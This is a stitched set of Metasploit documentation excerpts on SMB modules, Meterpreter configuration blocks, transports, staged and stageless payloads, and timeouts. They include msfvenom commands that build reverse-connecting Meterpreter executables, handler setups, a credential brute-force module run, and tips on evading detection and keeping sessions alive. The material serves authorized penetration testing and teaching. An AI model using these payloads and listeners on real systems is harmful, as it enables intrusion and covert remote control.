    "content": "SMB (Server Message Blocks), is a way for sharing files across nodes on a network. There are two main ports for SMB: . | 139/TCP - Initially Microsoft implemented SMB on top of their existing NetBIOS network architecture, which allowed for Windows computers to communicate across the same network | 445/TCP - Newer versions of SMB use this port, were NetBIOS is not used. | . Other terminology to be aware of: . | SMB - Server Message Blocks | CIFS - Common Internet File System | Samba - A free software re-implementation of SMB, which is frequently found on unix-like systems | . Metasploit has support for multiple SMB modules, including: . | Version enumeration | Verifying/bruteforcing credentials | Capture modules | Relay modules | File transfer | Exploit modules | . There are more modules than listed here, for the full list of modules run the search command within msfconsole: . msf &gt; search smb . Or to search for modules that work with a specific session type: . msf &gt; search session_type:smb . Lab Environment . When testing in a lab environment - SMB can be used on a Window’s host machine, or within Docker. For instance running Samba on Ubuntu 16.04: . docker run -it --rm --publish 127.0.0.1:139:139 --publish 127.0.0.1:445:445 ubuntu:16.04 /bin/bash mkdir -p /tmp/foo apt update apt install -y samba . Verifying version is as expected: . $ samba --version Version 4.3.11-Ubuntu . Configuring the share: . cat &lt;&lt; EOF &gt;&gt; /etc/samba/smb.conf [foo_share] comment = Foo samba share path = /tmp/foo read only = no browsable = yes EOF . Restart the service: . service smbd restart . SMB Login and Interactive Sessions . When using the smb_login module, the CreateSession option can be used to obtain an interactive session within the smb instance. Running with the following options: . msf auxiliary(scanner/smb/smb_login) &gt; run CreateSession=true RHOSTS=172.14.2.164 RPORT=445 SMBDomain=windomain.local SMBPass=password SMBUser=username .

Advantages . | Simpler to reason about as an end user | Less complex to implement, and can be built upon the current Options/Datastore implementation with relative ease | As a user it’s now easy to configure one option | The user can directly copy/paste a URL from their browser into msfconsole to run a check module against | Helps to catch improperly set ports. For instance, setting the SSL option to true - but forgetting to update RPORT to 443 | Backwards compatible | The existing metadata/options remains intact for the user to view | . Disadvantages . | It is not possible to set multiple multiple targets. However this can still be implemented with resource scripts. | Harder to discover, we will have to add extra affordance for this - and make additional noise to help increase the awareness of this new functionality | Users may raise issues asking for the next obvious step of multiple targets | Future compatibility issues. If we decide implement support for multiple independent targets, there’s some baggage introduced in needing to alias RURL to RURLS etc. | . Additional considerations . | How likely are individuals to actually scan against completely arbitrary endpoints with independent ports etc in the real world? | There will be no changes to the SSL_VERSION option as part of this effort | When setting multiple targets, is a comma delimited string \", \" to separate targets the best approach? It’s technically possible that copied URLs from the browser potentially contain this substring. Additional affordance may need to be added to ensure commas without a trailing whitespace is notified as being a potential issue. | The naming of TARGETURI is unintuitive, perhaps it could be renamed to RPATH | The chosen implementation should ensure file support is not broken . | https://github.com/rapid7/metasploit-framework/pull/11497 | . | Consistency across module types, and external modules, will have to be ensured: . | https://github.com/rapid7/metasploit-framework/issues/13061 | . | Will database modules be impacted by this change?

If you are going to configure the database manually you can find more information on the Managing the Database page. Getting Started . Initialize the Database and Web Service . Execute msfdb init and respond to prompts during the interactive initialization. The script first creates and configures the database, then it configures the web service, and finally configures the local msfconsole with the new data service connection. msfdb . The msfdb tool allows you to manage both the Metasploit Framework database and web service components together or independently. If the --component option is not provided then the specified command will be executed for the database followed by the web service. This default mode of operation is useful when first setting up the database and web service. The component may be specified if you wish to make changes to a given component independent of the other. Usage: msfdb [options] &lt;command&gt; . | Options: . | Execute msfdb --help for the complete usage information | . | Commands: . | init - initialize the component | reinit - delete and reinitialize the component | delete - delete and stop the component | status - check component status | start - start the component | stop - stop the component | restart - restart the component | . | .

Notes . | SSL is enabled by default and msfdb will generate a fake “snakeoil” SSL certificate during initialization using Rex::Socket::Ssl.ssl_generate_certificate if one is not provided. The generated SSL certificate uses a random common name (CN) which will not match your hostname, therefore, you will need to make appropriate accommodations when operating the web service with such a certificate. Please generate your own SSL certificate and key instead and supply those to msfdb using the --ssl-cert-file and --ssl-key-file options, and enable SSL verification by passing the option --no-ssl-disable-verify. | A simple verification that web service is up and running can be performed using cURL: curl --insecure -H \"Accept: application/json\" -H \"Authorization: Bearer &lt;token&gt;\" https://localhost:5443/api/v1/msf/version . | .

Meterpreter has always needed to be configured on the fly so that it knows how to talk to Metasploit. For many years, this configuration management was achieved by hot-patching a copy of the metsrv DLL/binary using a simple “string replace” approach. This worked well enough to support a number of situations but restricted the flexibility of Meterpreter and its support for handling multiple transports. It wasn’t just transports that were locked down, but the ability to provide payloads that contained way more than the core Meterpreter (metsrv) itself. It was also not easy to pass other forms of information on the fly to the Meterpreter instance because the stagers were only able to pass in a copy of the active socket handle. Recent modifications to Meterpreter have done away with this old method and have replaced with a dynamic configuration block that can be used to alleviate these problems and provide the flexibility for other more interesting things down the track. This document contains information on the structure and layout of the new configuration block, along with how it is used by Meterpreter. ",

    "content": "In the past, Meterpreter has required that the stager (or stage0 as some like to call it) pass in a handle to the active socket so that it can take over communications without creating a new socket (at least in the case of TCP connections). While this feature is still required, it doesn’t happen in the way that it used to. Instead, Meterpreter now requires that the stager pass in a pointer to the start of the configuration block. The configuration block can be anywhere in memory, so long as the memory region is marked as RWX. Loading configuration in Windows Meterpreter . Stage 1 of loading Windows Meterpreter now utilises a new loader, called meterpreter_loader (Win x86, Win x64), which does the following: . | Loads the metsrv DLL from disk. | Patches the DOS header of the DLL so that it contains executable shellcode that correctly initializes metsrv and calculates the location that points to the end of metsrv in memory. It also takes any existing socket value (found in edi or rdi depending on the architecture) and writes that directly to the configuration (more on this later). | Generates a configuration block and appends this to the metsrv binary. | . The result is that the payload has the following structure once it has been prepared: . +--------------+ | Patched DOS | header | +--------------+ | . metsrv dll . | +--------------+ | config block | +--------------+ . Loading configuration in POSIX Meterpreter (Mettle) . All of the configuration for the POSIX Meterpreter is able to be passed through command-line arguments to the payload. When generating a payload with a specific configuration, a simulated command line is patched into a static variable in the main startup code.

  },"629": {
    "doc": "Configuration",
    "title": "Windows Meterpreter configuration block structure",
    "content": "In order to pass information to Meterpreter and not have it break, a known format of configuration is required. This format needs to be consistent on each invocation, much like you would expect with any configuration. In the case of binary Meterpreter (POSIX and Windows), this configuration block contains the following: . | One Session configuration block. | One or more Transport Configuration blocks, followed by a terminator. | One or more Extension configuration blocks, followed by a terminator. | . Each of these blocks is described in detail in the sections below. Session configuration block . The notion of a session configuration block is used to wrap up the following values: . | Socket handle - When Meterpreter is invoked with TCP communications, an active socket is already in use. This socket handle is intended to be reused by Meterpreter when metsrv executes. This socket handle is written to the configuration block on the fly by the loader. It is stored in the Session configuration block so that it has a known location. This value is always a 32-bit DWORD, even on 64-bit platforms. | Exit func - This value is a 32-bit DWORD value that identifies the method that should be used when terminating the Meterpreter session. This value is the equivalent of the Block API Hash that represents the function to be invoked. Meterpreter used to delegate the responsibility of handling this to the stager that had invoked it. Meterpreter no longer does this, instead, it handles the closing of the Meterpreter session by itself, and hence the chosen method for termination must be made known in the configuration. | Session expiry value - This is a 32-bit DWORD that contains the number of seconds that the Meterpreter session should last for. While Meterpreter is running, this value is continually checked, and if the session expiry time is reached, then Meterpreter shuts itself down. For more information, please read Meterpreter Timeout Control. | UUID - This is a 16-byte value that represents a payload UUID. A UUID is a new concept that has come to Metasploit with a goal of tracking payload type and origin, and validating that sessions received by Metasploit are intended for use by the current installation. For more information, please read Payload UUID. | . The layout of this block in memory looks like this: . +--------------+ |Socket Handle | +--------------+ | Exit func | +--------------+ |Session Expiry| +--------------+ | | UUID | | | +--------------+ | &lt;- 4 bytes -&gt;| . With this structure in place, Meterpreter knows that the session configuration block is exactly 28 bytes in size. The Session configuration block description can be found in the Meterpreter source. Transport configuration block . The Transport configuration block is a term used to refer to the group of transport configurations that are present in the payload. Meterpreter now supports multiple transports, and so the configuration should support multiple transports too. There are two main issues when dealing with transport configurations: . | The configuration should allow for many transport configurations to be specified. | The configuration should allow for each transport to be of a different type and size. | . Meterpreter’s current transport implementations provide two main “classes” of transport, those being HTTP(S) and TCP. Each of these transport classes requires different configuration values, as well as common values, in order to function. Common configuration values . The values that are common to both HTTP(S) and TCP transports are: . | URL - This value is a meta-description of the transport and is used not only as a configuration element for the transport itself but also as a way of determining what type of transport this block represents. The field is a total of 512 characters (Windows Meterpreter uses wchar_t, while POSIX Meterpreter uses char). Transport types are specified by the scheme element in the URL, and the body of the URL specifies key information such as host and port information. Meterpreter inspects this to determine what type of transport block is in use, and hence from there is able to determine the size of the block. Valid values look like the following: . | tcp://&lt;host&gt;:&lt;port&gt; - indicates that this payload is a reverse IPv4 TCP connection. | tcp6://&lt;host&gt;:&lt;port&gt;?&lt;scope&gt; - indicates that this payload is a reverse IPv6 TCP connection. | tcp://:&lt;port&gt; - indicates that this payload is a bind payload listening on the specified port (note that no host is specified). | http://&lt;host&gt;:&lt;port&gt;/&lt;uri&gt; - indicates that this payload is an HTTP connection (can only be reverse). | https://&lt;host&gt;:&lt;port&gt;/&lt;uri&gt; - indicates that this payload is an HTTPS connection (can only be reverse). | . | Communications expiry - This value is another 32-bit DWORD value that represents the number of seconds to wait between successful packet/receive calls. For more information, please read the Timeout Control documentation. | Retry total - This value is 32-bit DWORD value that represents the number of seconds that Meterpreter should continue to attempt to reconnect on this transport before giving up. For more information, please read the Timeout Control documentation. | Retry wait - This value is 32-bit DWORD value that represents the number of seconds between each attempt that Meterpreter makes to reconnect on this transport. For more information, please read the Timeout Control documentation. | . The layout of this block in memory looks like the following: . +--------------+ | | URL | . 512 characters worth . (POSIX -&gt; ASCII -&gt; char) . (Windows -&gt; wide char -&gt; wchar_t) . | +--------------+ | Comms T/O | +--------------+ | Retry Total | +--------------+ | Retry Wait | +--------------+ | &lt;- 4 bytes -&gt;| . The common transport configuration block description can be found in the Meterpreter source. TCP configuration values . At this time, there are no TCP-specific configuration values, as the common configuration block caters for all of the needs of TCP transports. This may change down the track. HTTP/S configuration values . HTTP and HTTPS connections have a number of extra configuration values that are required in order to make it function correctly in various environments. Those values are: . | Proxy host - In environments where proxies are required to be set manually, this field contains the detail of the proxy to use. The field is 128 characters in size (wchar_t only, given that we don’t yet have HTTP/S transport in POSIX), and can be in one of the following formats: . | http://&lt;proxy ip&gt;:&lt;proxy port&gt; in the case of HTTP proxies. | socks=&lt;socks ip&gt;:&lt;sock port&gt; in the case of socks proxies. | . | Proxy user name - Some proxies require authentication. In such cases, this value contains the username that should be used to authenticate with the given proxy. This field is 64 characters in size (wchar_t). | Proxy password - This value will accompany the user name field in the case where proxy authentication is required. It contains the password used to authenticate with the proxy and is also 64 characters in size (wchar_t). | User agent string - Customisable user agent string. This changes the user agent that is used when HTTP/S requests are made to Metasploit. This field is 256 characters in size (wchar_t). | Expected SSL certificate hash - Meterpreter has the capability of validating the SSL certificate that Metasploit presents when using HTTPS. This value contains the 20-byte SHA1 hash of the expected certificate. For more information, please read the SSL certificate validation documentation (link coming soon). | . All values that are shown above need to be specified in the configuration, including SSL certificate validation for plain HTTP connections. Values that are not used should be zeroed out. The structure of the HTTP/S configuration is as follows. +--------------+ | | Proxy host | . 128 characters worth (wchar_t) | +--------------+ | | Proxy user | . 64 characters worth (wchar_t) | +--------------+ | | Proxy pass | . 64 characters worth (wchar_t) | +--------------+ | | User agent | . 256 characters worth (wchar_t) | +--------------+ | | SSL cert | SHA1 hash | | | +--------------+ | &lt;- 4 bytes -&gt;| . The HTTP/S transport configuration block description can be found in the Meterpreter source. Transport configuration list . As already mentioned, more than one of these transport configuration blocks can be specified. In order to facilitate this, Meterpreter needs to know when the “list” of transports has ended. Using the URL, Meterpreter can determine the size of the block and can move to the next block, depending on the type that is discovered. As soon as Meterpreter detects a transport configuration URL value that has a string length of zero, for example, a single NULL ASCII char in POSIX and a single NULL multi-byte char in Windows, it assumes that the transport list has been terminated. The byte immediately following this is deemed to be the start of the Extension configuration, which is documented in the next section. Extension configuration block . The extension configuration block is designed to allow Meterpreter payloads to contain any extra extensions that the user wants to bundle in. The goal is to provide the ability to have Stageless payloads, and to provide the means for sharing of extensions during migration (though this hasn’t been implemented yet). Each of the extensions must have been compiled with Reflective DLL Injection support, as this is the mechanism that is used to load the extensions when Meterpreter starts. For more information on this facility, please see the Stageless payloads documentation. The extension configuration block also functions as a “list” to allow for an arbitrary number of extensions to be included. Each extension entry needs to contain: . | Size - This is the exact size, in bytes, of the extension DLL itself. The value is a 32-bit DWORD. | Extension binary - This is the full binary directly copied from the DLL. This value needs to be exactly the same length as what is specified in the Size field. | . When loading the extensions from the configuration, Meterpreter will continue to parse entries until it finds a size value of 0. At this point, Meterpreter assumes it has reached the end of the extension list and will stop parsing. The structure is simply laid out like the following: . +--------------+ | Ext. Size | +--------------+ | Ext. content | +--------------+ | NULL term. | (4 bytes) | +--------------+ . ",

    "title": "HTTP Communication",
    "content": "The Meterpreter payload supports a number of transport, including reverse_http and reverse_https. This document describes how these transports work. The Initial URL . During the generation process for a new reverse_http or reverse_https payload, an initial connect-back URL will be created. This URL will be either “short” or “long” and the 8-bit checksum of this URL will be set to one of the INIT_* constants defined in the UriChecksum mixin. The URL will be generated using the base64url character set. The “short” URL will always be 5 bytes in length while the “long” URL will be between 30 and 128 bytes in length. Which variant is used is determined by the space constraints of the exploit that generates the payload. The “long” URL can also include an embedded Payload UUID. The Connection URL . The HTTP handler within Metasploit will receive the request for the initial URL, determine which INIT_* checksum it correlates to, extract any embedded Payload UUID, and then respond with either the second stage for staged payloads or a new URL for stageless payloads. The new URL is generated by the handler, will embed any Payload UUID that was included in the original request, and will hash to the value defined by the URI_CHECKSUM_CONN constant. Note that characters other than the base64url character set are ignored during calculation of the checksum. The connect URL must be unique between sessions in order for the sessions to function properly. TLS Certificate Pinning . The Meterpreter HTTPS transport supports certificate pinning. This applies to the stageless payloads as well as Meterpreter payloads loaded with the reverse_winhttps stagers. At this time, some of the non-Windows stagers also support certificate pinning, but this is still a work in progress. Certificate pinning is enabled by setting the StagerVerifySSLCert option to true and by extracting a SHA1 hash of the certificate specified in the HandlerSSLCert option. The SHA1 hash of the certificate will be verified during the staging process, and also in the handler, if these options are specified in the listener. This feature requires the pre-generation of a unified SSL/TLS certificate in PEM format, with the private key followed by one or more certificates in the chain. If an incoming session connects through a man-in-the-middle proxy that presents a different certificate, the first connection will connect back, but then immediately terminate. The handler will detect a non-responsive connection and close the session automatically. The command below generates a custom unified PEM TLS certificate that works with the HandlerSSLCert option: . $ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \\ -subj \"/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com\" \\ -keyout www.example.com.key \\ -out www.example.com.crt &amp;&amp; \\ cat www.example.com.key www.example.com.crt &gt; www.example.com.pem &amp;&amp; \\ rm -f www.example.com.key www.example.com.crt . The Application Protocol . Once the Meterpreter connect URL is requested, the actual dispatch loop starts to run. The Meterpreter payload will make repeated requests with a HTTP body consistent of “RECV”. Any queued commands will be returned to the payload, which will process them individually, and return the results in a following request. If no commands were returned as a result of a “RECV” request, the payload will double the interval until the next request, with a maximum that is generally about 10 seconds. Additional details about the configuration of the HTTP transport can be found on the transport control wiki page. ",

This document walks through the process of implementing a paranoid Meterpreter payload and listener. Create a SSL/TLS Certificate . For best results, use a SSL/TLS certificate signed by a trusted certificate authority. Failing that, you can still generate a self-signed unified PEM using the following command: . $ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \\ -subj \"/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com\" \\ -keyout www.example.com.key \\ -out www.example.com.crt &amp;&amp; \\ cat www.example.com.key www.example.com.crt &gt; www.example.com.pem &amp;&amp; \\ rm -f www.example.com.key www.example.com.crt .

A stageless version of this would look like the following: . $ ./msfvenom -p windows/meterpreter_reverse_https LHOST=www.example.com LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./www.example.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless -f exe -o launch-paranoid-stageless.exe No platform was selected, choosing Msf::Module::Platform::Windows from the payload No Arch selected, selecting Arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 885314 bytes Saved as: launch-paranoid-stageless.exe . Create a Paranoid Listener . A staged payload would need to set the HandlerSSLCert and StagerVerifySSLCert options to enable TLS pinning and IgnoreUnknownPayloads to whitelist registered payload UUIDs: . $ ./msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_winhttps; set LHOST www.example.com; set LPORT 443; set HandlerSSLCert ./www.example.com.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j' .

    "content": "Of the many recent changes to Meterpreter, reliable network communication is one of the more welcomed ones. For a long time, Meterpreter’s communication with Metasploit has been relatively easy to break. Once broken, the session was officially dead, and the only way to get a session back was to replay the original exploitation path and establish a whole new session. In the case of HTTP/S transports, some resiliency features were present. Thanks to its stateless nature, HTTP/S transports would continue to attempt to talk to Metasploit after network outages or other unexpected problems as each command request/response is transmitted over a fresh connection. TCP based transports had nothing that would attempt to reconnect should some kind of network issue occur. Revamped transport implementations have provided support for resiliency even for TCP based communications. Any session that isn’t properly terminated by Metasploit will continue to function behind the scenes while Meterpreter attempts to re-establish communications with Metasploit. It is also possible to control the behaviour of this functionality a little via the use of the various timeout values that can be specified when adding transports to the session, and also on the fly for the current transport. For full details, please see the timeout documentation for details on those timeout values. Behind the scenes, Meterpreter now maintains a circular linked list of transports in memory while running. When a transport fails, Meterpreter will shut down and clean up the current transport mechanism resources, and will move onto the next one in the list. From there, Meterpreter will use this transport configuration to attempt to reconnect to Metasploit. It will continue to make these attempts until one of the following occurs: . | The overall session timeout value is reached, at which point the session is terminated. | The Retry Total time for the transport is reached, at which point Meterpreter will move on to the next transport. | The connection attempt is successful, and communications is re-established with Metasploit. | . If Meterpreter has a single transport configured, then it will continue to retry on that single transport repeatedly until the session timeout is reached, or a session is successfully created. ",

    "content": "Noise during an assessment is not necessarily a good thing. With the advent of Meterpreter’s new support and control of multiple transports, Meterpreter has the ability to change transports and therefore change the traffic pattern for communication. However, sometimes this isn’t enough and sometimes users want to be able to shut the session off temporarily. The sleep command is designed to do just that: make the current Meterpreter session go to sleep for a specified period of time, and the wake up again once that time has expired. During this dormant period, no socket is active, no requests are made, and no responses are given. From the perspective of Metasploit it’s as if the Meterpreter session doesn’t exist. The interface to the sleep command looks like this: . meterpreter &gt; sleep Usage: sleep &lt;time&gt; time: Number of seconds to wait (positive integer) This command tells Meterpreter to go to sleep for the specified number of seconds. Sleeping will result in the transport being shut down and restarted after the designated timeout. As shown, sleep expects to be given a single positive integer value that represents the number of seconds that Meterpreter should be silent for. When run, the session will close, and then callback after the elapsed period of time. Given that Meterpreter lives in memory, this lack of communication will make it extremely difficult to track. The following shows a sample run where Meterpreter is put to sleep for 20 seconds, after which the session reconnects while the handler is still in background: . meterpreter &gt; sleep 20 [*] Telling the target instance to sleep for 20 seconds ...

Staged payloads are often used in exploit scenarios due to the fact that binary exploitation often results in very little space for shellcode to be stored. The initial shellcode (often referred to as stage0) may create a new connection back to the attacker’s machine and read a larger payload into memory. Once the payload has been received, stage0 passes control to the new, larger payload. In Metasploit terms, this payload is called reverse_tcp, and the second stage (stage1) might be a standard command shell, or it might be something more complex, such as a Meterpreter shell or a VNC session. There are other staged options such as reverse_https and bind_tcp, both of which provide different transport options for opening the doorway for the second stage. ",

    "content": "Staged Meterpreter is Meterpreter as we currently know it. Every time we set PAYLOAD windows/meterpreter/... we are asking Metasploit to prepare a payload that is broken into two stages, the second of which gives us a Meterpreter session. For the benefit of those who aren’t familiar with the process of exploitation with staged payloads, let’s take a look at what goes on when we use this payload to exploit a Windows machine using ms08_067_netapi. The following image is a representation of two machines, an attacker and a target. The former is running Metasploit with the ms08_067_netapi exploit configured to use a staged Meterpreter payload that has stage0 set to reverse_tcp using port 4444. The latter is an instance of Windows running a vulnerable implementation of SMB listening on port 445. When the payload is executed, Metasploit creates a listener on the correct port, and then establishes a connection to the target SMB service. Behind the scenes, when the target SMB service receives the connection, a function is invoked which contains a stack buffer that the attacking machine will overflow. The attacking machine then sends data that is bigger than the target expects. This data, which contains stage0 and a small bit of exploit-specific code, overflows the target buff. The exploit-specific code allows for the attacker to gain control over EIP and redirect process execution to the stage0 shellcode. At this point, the attacker has control of execution within the SMB service, but doesn’t really have the ability to do much else with it due to the size constraint. When stage0 (reverse_tcp) executes, it connects back to the attacker on the required port, which is ready and waiting with stage1. In the case of Meterpreter, stage1 is a DLL called metsrv. The metsrv DLL is then sent to the target machine through this reverse connection. This is what is happening when we see the “Sending stage …” message in msfconsole. The byte count that is shown in the “Sending stage” message represents the entire metsrv component as well as a configuration block. Once this has been pushed to the target machine, the stage0 shellcode writes this into memory. Once stage1 is in memory, stage0 passes control to it by simply jumping to the location where the payload was written to. In the case of metsrv, the first 60(ish) bytes is a clever collection of shellcode that also looks similar to a valid DOS header. This shellcode, when executed, uses Reflective DLL Injection to remap and load metsrv into memory in such a way that allows it to function correctly as a normal DLL without writing it to disk or registering it with the host process. It then invokes DllMain() on this loaded DLL, and the Meterpreter that we know and love takes over. From here, MSF pushes up two Meterpreter extension DLLs: stdapi and priv. Both of these are also reflectively loaded in the same way the original metsrv DLL was. At this point, Meterpreter is now ready and willing to take your commands. ",

    "title": "What’s wrong with staged Meterpreter?",
    "content": "Staged Meterpreter, in scenarios like that shown above, is a wonderful thing and works very well. However, the are other scenarios for compromise where this approach is less than ideal. In case you didn’t notice, in order to get a Meterpreter session running in the example scenario we uploaded the following: . | stage0: large buffer of junk plus approximately 350b of shellcode. | stage1: 32bit metsrv DLL approximately 169kb plus the configuration block. | stage2: 32bit stdapi DLL approximately 332kb. | stage3: priv DLL approximately 104kb. | . For a single session, the grand total of 605kb (ish) doesn’t feel like much. It’s certainly nothing compared to the 1mb+ we used to serve up! But when you end up in the situation where many shells come in at once, this adds up very quickly. The most common example of where this falls down is the case where penetration testers are in a low-bandwidth or high-latency environments and have pre-generated a staged Meterpreter binary that is then hosted outside of the attacker’s machine. Assessment targets download and invoke this binary, which results in the attacker gaining a Meterpreter shell on the target machine. The data or time cost of uploading metsrv, stdapi and priv for every single shell becomes unwieldy or outright impossible, even for a small number of shells. For large-scale compromise, via approaches such as GPO updates or SCCM packages, handling the volume of incoming connections at once can be bad enough; add the three DLL uploads to this mix and you have a recipe for lost shells and sadness. Nobody likes losing shells. Nobody likes sadness. It’s hard to believe it possible, but in this case the following image could be considered a nightmare. [*] Sending stage (173056 bytes) to xxx.xxx.xxx.xxx [*] Meterpreter session 4684 opened .... [*] Sending stage (173056 bytes) to xxx.xxx.xxx.xxx [*] Meterpreter session 4685 opened .... [*] Sending stage (173056 bytes) to xxx.xxx.xxx.xxx [*] Meterpreter session 4686 opened .... [*] Sending stage (173056 bytes) to xxx.xxx.xxx.xxx [*] Meterpreter session 4687 opened .... [*] Sending stage (173056 bytes) to xxx.xxx.xxx.xxx [*] Meterpreter session 4688 opened .... [*] Sending stage (173056 bytes) to xxx.xxx.xxx.xxx [*] Meterpreter session 4689 opened .... In such a scenario, it would be better to have the ability to create a stage0 which includes metsrv and any number of Meterpreter extensions. This means that the payload already includes the important part of the Meterpreter functionality, along with all the features that the attacker might require. When invoked, the Meterpreter instance already has all it needs to function, and hence Metasploit doesn’t need to waste time or bandwidth performing the usual uploads that are required with the staged approach. Stageless Meterpreter is exactly that. It is a binary that includes all of the required parts of Meterpreter, along with any required extensions, all bundled into one. ",

    "title": "What does stageless Meterpreter look like?",
    "content": "As with the staged version, stageless Meterpreter payloads begin with a small bootstrapper. However, this bootstrapper looks very different. Staged Meterpreter payload bootstrappers contain shellcode that performs network communications in order to read in the second stage prior to invoking it. The stageless counterparts don’t have this responsibility, as it is instead handled by metsrv itself. As a result, what we know as stage0 completely disappears. Instead, that which is known as stage1 in staged Meterpreter land becomes the bootstrapper for the payload in stageless Meterpreter land. To make this clear, let’s take a look at the process. When creating the payload, Metasploit first reads a copy of the metsrv DLL into memory. It then overwrites the DLL’s DOS header with a selection of shellcode that does the following: . | Performs a simple GetPC routine. | Calculates the location of the ReflectiveLoader() function in metsrv. | Invokes the ReflectiveLoader() function in metsrv. | Calculates the location of the start of a custom Configuration Block that contains information about transports, extensions and extension-specific initialisation scripts. This configuration block appears in memory immediately after metsrv. | Invokes DllMain() on metsrv, passing in DLL_METASPLOIT_ATTACH along with the pointer to the configuration block. This is where metsrv takes over. | . With this shellcode stub wired into the DOS header, Metasploit adds the entire binary blob to an in-memory payload buffer and then iterates through the list of chosen extensions. For each extension that is specified, Metasploit does the following: . | Loads the extension DLL into memory. | Calculates the size of the DLL. | Writes the size of the DLL as a 32-bit value to the configuration block. | Writes the entire body of the DLL, as-is, to the end of the configuration block. | . Once the end of the list of extensions is reached, the last thing that is written to the payload buffer is a 32-bit representation of 0 (NULL) which indicates that the list of extensions has been terminated. This NULL value is what metsrv will look for when iterating through the list of extensions so that it knows when to stop. After this, any extension initialisation scripts are wired in (though that’s beyond the scope of this article). The final payload layout looks like the following: . +-+--------+-----------------------------------------------------------+ | | Configuration Block |b|+-----------+-+---------+-+---------+-------+-----------+-+|o|| session |S|S| |N||o| metsrv || and |i| ext 1 |i| ext 2 | ... | ext inits |U||t|| transport |z|z| |L|| || config |e|e| |L|| |+-----------+-+---------+-+---------+-------+-----------+-+| +-+--------+-----------------------------------------------------------+ . This payload can be embedded in an exe file, encoded, thrown into an exploit (assuming there’s room!), and who knows what else! The important thing is that we now have all of the bits that we need in the one payload. ",

It follows the same convention as all of the other staged vs stageless payloads: . | Payload | Staged | Stageless | . | Reverse TCP | windows/meterpreter/reverse_tcp | windows/meterpreter_reverse_tcp | . | Reverse HTTPS | windows/meterpreter/reverse_https | windows/meterpreter_reverse_https | . | Bind TCP | windows/meterpreter/bind_tcp | windows/meterpreter_bind_tcp | . | Reverse TCP IPv6 | windows/meterpreter/reverse_ipv6_tcp | windows/meterpreter_reverse_ipv6_tcp | . To create a payload using one of these babies, you use msfvenom just like you would any other payload. To make a stageless payload that contains only metsrv we do the following: . $ ./msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4444 -f exe -o stageless.exe . To add extensions to the payload, we can make use of the EXTENSIONS parameter, which takes a comma-separated list of extension names. $ ./msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4444 EXTENSIONS=stdapi,priv -f exe -o stageless.exe . With a payload created, we can set up a listener which will handle the connection using msfconsole. Note that the EXTENSIONS parameter isn’t set in the handler. This is because the handler isn’t responsible for them as they’re already in the payload binary. When a session is established, you’ll also note the lack of the “Sending stage …” message! This shows that the upload of stage1 didn’t happen as it’s not needed. If the payload that was invoked also contained stdapi and priv, then absolutely no uploads have occurred at this point. Congratulations, you’re dancing with stageless Meterpreter! . At this point, all of the pre-loaded extensions have been loaded into Meterpreter and are available for use. However, Metasploit is yet to know about them. To initiate client-site wiring of any of the pre-loaded extensions, the user can just type use &lt;extension&gt; just like they used to. Metasploit will check to see if the extension already exists in the target instance, and if it does, it will skip the extension upload and just wire-up the functions on the client side. If the extension is missing, then it will upload it and wire-up the functions on the fly just like it always has done. If you’re working with meterpreter_reverse_https, you’ll notice that when new shells come in they appear just like an orphaned instance. This is expected behaviour, because a stageless session can’t and won’t look any different to an old session that hasn’t been in touch with Metasploit for a while. ",

The default value used is the equivalent of one whole week (604800 seconds), and hence this is what is used if the user does not override the value manually. The session’s life begins at the point that metsrv (Meterpreter’s core) takes over from the initial stage (if there is one). Once running, the session timer begins, and Meterpeter will monitor this timeout so that as soon as it is reached the session will be closed. If the timeout value is set to zero, this tells Meterpreter to never kill the session. If you’re looking to have Meterpreter run for as long as it can, then setting this value to zero is the way to do it. It’s important to note that this value lives outside of the realms of the other timeout values. That is, this value applies to Meterpreter as a whole, where the other three timeouts are specific to the individual transports that have been configured within the session. Meterpreter Transport Timeouts . Each transport that is configured inside Meterpreter has three timeouts. The are as follows: . Communication Timeout . When Meterpreter talks to Metasploit packets are exchanged at a low level in a request/response fashion. In the case of TCP transports, this req/rep pattern is basically instant because TCP is a persistent connection. A request is handled by Meterpreter, and the response is immediately transferred as soon as the command has finished executing. In the case of HTTP/S payloads it’s slightly different because the protocols are stateless. Meterpreter makes a GET request to Metasploit to check to see if a command has been executed by the user. The command is returned, the connection is closed, and Meterpreter executes the command asynchronously. When the command execution finishes, a second request is made that POSTs the result back to Metasploit so that the user can consume it. Hence, for each command invocation, there are two HTTP/S requests. With TCP transports, communication “times out” when the time between the last packet and the current socket poll is greater than the communications timeout value. This happens when there are network related issues that prevent data from being transmitted between the two endpoints, but doesn’t cause the socket to completely disconnect. With HTTP/S transports, the communication “times out” for the same reason, but the evaluation of the condition is slightly different in that failure can occur because there is either no response at all from the remote server, or the response to a GET request results in no acknowledgement. By default, this value is set to 300 seconds (5 minutes), but can be overridden by the user via the SessionCommunicationTimeout setting. If connectivity fails, or the communication is deemed to have timed out. Then the current transport is destroyed, and the next transport in the list of transports is invoked. From there, Meterpreter will use the Retry Total and Retry Wait values while attempting to re-establish a session with Metasploit. Retry Total and Retry Wait . After a transport initialises inside Meterpreter, Meterpreter uses this transport to attempt to establish a new session with Metasploit. In some cases, Metasploit might not be available due to reasons like bad network connectivity, or a lack of configured listeners. If Meterpreter can’t connect to Metasploit, it will attempt to retry for a period of time. Once that period of time expires, Meterpreter will deem this transport “dead” and will move to the next one in the transport list. The total amount of time that Meterpreter will attempt to connect back to Metasploit on the given transport is indicated by the retry total value. That is, retry total is the total amount of time that Meterpreter will retry communication on the transport. The default value is 3600 seconds (1 hour), and can be overridden via the SessionRetryTotal setting. While the current time is within the retry total time, Meterpreter will constantly attempt to establish connectivity. If it fails, it will wait for a period of time before trying again. The time between retry attempts on the current transport is called retry wait. That is, Meterpreter will wait for the number of seconds specified in retry wait between each connection attempt on the current transport. The default value is 10 seconds, and can be overridden via the SessionRetryWait setting. ",

